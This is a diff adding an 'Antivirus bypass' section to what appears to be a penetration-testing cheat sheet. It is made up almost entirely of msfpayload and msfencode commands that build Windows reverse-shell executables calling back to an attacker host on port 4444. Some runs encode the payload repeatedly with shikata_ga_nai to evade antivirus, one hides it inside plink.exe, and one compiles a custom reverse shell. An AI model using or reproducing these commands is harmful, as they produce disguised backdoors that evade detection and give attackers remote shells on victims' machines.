@@ -139,3 +139,30 @@ Attacker machine
 
 > python3 -m http.server 8000
 
+## ANTIVIRUS BYPASS
+
+Normal exploit
+
+```
+msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 X > ~/Desktop/shell_reverse.exe
+```
+
+MSF Encoded Exploit
+
+```
+msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -o ~/Desktop/shell_reverse_msf_encoded.exe
+```
+
+MSF Encoded Embedded Exploit
+
+```
+msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -x /usr/share/windows-binaries/plink.exe -o ~/Desktop/shell_reverse_msf_encoded_embedded.exe
+```
+
+Custom Tool:
+
+```
+i586-mingw32msvc-gcc reverse.c -o ~/Desktop/custom-reverse.exe -lws2_32
+```
+
+
